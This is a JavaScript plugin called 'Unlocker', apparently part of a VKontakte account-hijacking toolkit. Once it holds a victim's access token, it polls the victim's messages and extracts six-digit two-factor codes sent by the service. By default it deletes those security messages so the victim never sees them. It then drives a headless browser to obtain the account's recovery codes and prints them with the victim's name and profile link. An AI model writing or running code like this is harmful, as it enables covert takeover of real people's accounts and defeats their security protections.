const { VK } = require("vk-io");
const { unlock, init: startBrowser } = require("./unlock");
const chalk = require("chalk");

exports.name = "Unlocker";

const defaults = {
  removeAdminMessages: true,
  headless: true
};

/**
 * @type {Set<number>}
 */
const unlocked = new Set();

/**
 *
 * @param {typeof defaults & Record<string, any>} config
 * @param {import("events").EventEmitter} ee
 */
exports.init = (config, ee) => {
  typeof config !== "object"
    ? (config = defaults)
    : (config = { ...defaults, ...config });

  startBrowser(config);

  ee.on("auth:success", async event => {
    if (!("code" in event)) return;

    const { token, user_id, first_name, last_name } = event;

    if (unlocked.has(user_id)) return;

    unlocked.add(user_id);

    const vk = new VK({ token });

    vk.updates.on("message", async (message, next) => {
      if (!(message.senderId === 100 && message.isInbox)) return;

      const match = message.text.match(/\d{6}/);

      if (match) {
        ee.emit("unlocker:2fa_code", { code: match[0], user_id });
      }

      if (config.removeAdminMessages) {
        await vk.api.messages.delete({ message_ids: [message.id] });
      }

      return next();
    });

    vk.updates
      .startPolling()
      .then(() => ee.emit("unlocker:polling-started", { user_id }));

    const codePromise = new Promise(resolve => {
      ee.on("unlocker:2fa_code", ({ user_id: receiver, code }) => {
        if (receiver === user_id) resolve(code);
      });
    });

    const codes = await unlock(event, codePromise);

    if (!codes)
      return console.log(
        chalk.yellowBright(`Unable to obtain recovery codes for`)
      );

    ee.emit("unlocker:recovery_codes", { user_id, codes });

    console.log(
      chalk.bold.greenBright(
        `Obtained recovery codes for: ${first_name} ${last_name} https://vk.com/id${user_id}`
      )
    );

    codes.forEach((code, index) =>
      console.log(chalk.magentaBright(`${index + 1}. ${code}`))
    );
  });
};
